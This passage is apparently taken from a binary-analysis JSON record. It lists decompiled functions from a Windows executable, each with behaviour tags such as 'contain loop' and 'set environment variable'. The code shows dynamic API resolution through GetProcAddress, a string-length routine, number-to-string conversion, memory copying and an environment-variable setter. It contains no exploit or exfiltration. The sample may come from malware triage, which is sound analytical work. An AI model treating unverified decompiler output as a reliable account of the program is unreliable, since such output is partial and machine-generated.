        "decompiled_code": "\nvoid fcn.00402342(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x4010d0, 0x4010b8);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x406038 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x4010dc);\n    *0x406034 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x4010f4);\n    *0x406030 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x401114);\n    *0x40602c = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x40112c);\n    *0x406028 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x401148);\n    *0x406024 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x40116c);\n    *0x406020 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x401174);\n    *0x40601c = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x40117c);\n    *0x406018 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x401184);\n    *0x406014 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x40118c);\n    *0x406010 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x401194);\n    *0x40600c = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x40119c);\n    *0x406008 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x4011a4);\n    *0x406004 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0x4010d0, 0x4011ac);\n    *0x406000 = (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 683
    },
    "0040244a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040244a(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        iVar1 = iVar1 + 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 82
    },
    "00402463": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402463(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    \n    uVar3 = *(in_ECX + 0x414);\n    do {\n        uVar2 = arg_8h / arg_ch;\n        *(in_ECX + *(in_ECX + 0x414) * 2) = *((arg_8h % arg_ch) * 2 + 0x4011b8);\n        *(in_ECX + 0x414) = *(in_ECX + 0x414) + 1;\n        arg_8h = uVar2;\n    } while (uVar2 != 0);\n    *(in_ECX + *(in_ECX + 0x414) * 2) = 0;\n    uVar2 = *(in_ECX + 0x414);\n    for (; uVar2 = uVar2 - 1,  uVar3 < uVar2; uVar3 = uVar3 + 1) {\n        uVar1 = *(in_ECX + uVar3 * 2);\n        *(in_ECX + uVar3 * 2) = *(in_ECX + uVar2 * 2);\n        *(in_ECX + uVar2 * 2) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "00404e60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404e60(int32_t arg_8h)\n\n{\n    uchar *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    if (arg_8h != 0) {\n        iVar1 = in_EDX - in_ECX;\n        do {\n            *in_ECX = in_ECX[iVar1];\n            in_ECX = in_ECX + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0040352d": {
        "rules": [
            "set environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040352d(uint param_1)\n\n{\n    uint lpValue;\n    uint var_4h;\n    \n    var_4h = 0;\n    lpValue._0_2_ = 0;\n    fcn.00402463(param_1, 0x10);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(0x401204, &lpValue);\n    return;\n}\n",
        "token_count": 104
    }
}